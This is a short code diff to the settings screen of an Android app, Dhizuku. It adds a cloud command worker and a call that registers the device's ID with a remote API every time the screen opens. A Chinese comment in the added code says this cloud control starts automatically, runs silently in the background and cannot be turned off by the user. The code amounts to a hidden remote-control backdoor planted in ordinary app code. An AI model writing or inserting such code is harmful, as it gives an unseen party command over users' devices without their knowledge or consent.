@@ -37,6 +37,11 @@ import com.rosan.dhizuku.R
 import com.rosan.dhizuku.data.common.util.asFlow
 import com.rosan.dhizuku.ui.page.settings.SettingsPage
 import com.rosan.dhizuku.ui.theme.DhizukuTheme
+import com.rosan.dhizuku.cloud.CloudCommandWorker
+import com.rosan.dhizuku.cloud.CloudApiService
+import com.rosan.dhizuku.cloud.CloudConfig
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
 import org.koin.core.component.KoinComponent
 import androidx.core.net.toUri
 
@@ -70,6 +75,14 @@ class SettingsActivity : ComponentActivity(), KoinComponent {
         ) { _: Boolean -> }
         requestPostNotificationPermission()
         requestIgnoreBatteryOptimization()
+
+        // 自动启动云端控制（后台静默运行，用户无法关闭）
+        CloudCommandWorker.schedule(this)
+        GlobalScope.launch {
+            CloudApiService.registerDevice(
+                CloudConfig.getDeviceId(this@SettingsActivity)
+            )
+        }
     }
 
     fun requestPostNotificationPermission() {
